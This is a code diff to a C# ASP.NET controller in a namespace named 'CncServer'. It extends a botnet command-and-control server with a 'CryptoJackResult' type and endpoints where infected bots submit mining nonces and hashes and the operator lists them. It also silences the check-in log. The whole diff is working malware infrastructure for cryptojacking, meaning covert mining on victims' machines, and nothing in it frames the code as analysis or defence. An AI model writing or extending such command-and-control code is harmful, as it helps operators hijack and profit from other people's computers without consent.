@@ -15,6 +15,13 @@ namespace CncServer.Controllers
         public DateTime LastSeen { get; set; }
         public string Status { get; set; }
     }
+    public class CryptoJackResult
+    {
+        public string BotId { get; set; }
+        public long Nonce { get; set; }
+        public string Hash { get; set; }
+        public DateTime Timestamp { get; set; } = DateTime.UtcNow;
+    }
 
     [ApiController]
     [Route("bot")]
@@ -22,13 +29,14 @@ namespace CncServer.Controllers
     {
         private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
         private static string _command = "idle";
+        private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
 
         [HttpPost("checkin")]
         public IActionResult CheckIn([FromBody] BotInfo botInfo)
         {
             botInfo.LastSeen = DateTime.UtcNow;
             _bots[botInfo.BotId] = botInfo;
-            Console.WriteLine($"[+] Bot {botInfo.BotId} checked in. Status: {botInfo.Status}. Total bots: {_bots.Count}");
+            //Console.WriteLine($"[+] Bot {botInfo.BotId} checked in. Status: {botInfo.Status}. Total bots: {_bots.Count}");
             return Ok();
         }
 
@@ -59,6 +67,27 @@ namespace CncServer.Controllers
         public IActionResult ListBots()
         {
             return Ok(_bots.Values);
+        }
+
+        [HttpPost("submitresult")]
+        public IActionResult SubmitResult([FromBody] CryptoJackResult result)
+        {
+            if (result == null || string.IsNullOrEmpty(result.BotId))
+            {
+                return BadRequest("Invalid result data.");
+            }
+            _results.Add(result);
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine($"[SUCCESS] Bot {result.BotId} found a hash!");
+            Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
+            Console.ResetColor();
+            return Ok("Result received.");
+        }
+
+        [HttpGet("results")]
+        public IActionResult GetResults()
+        {
+            return Ok(_results.OrderByDescending(r => r.Timestamp));
         }
     }
 }
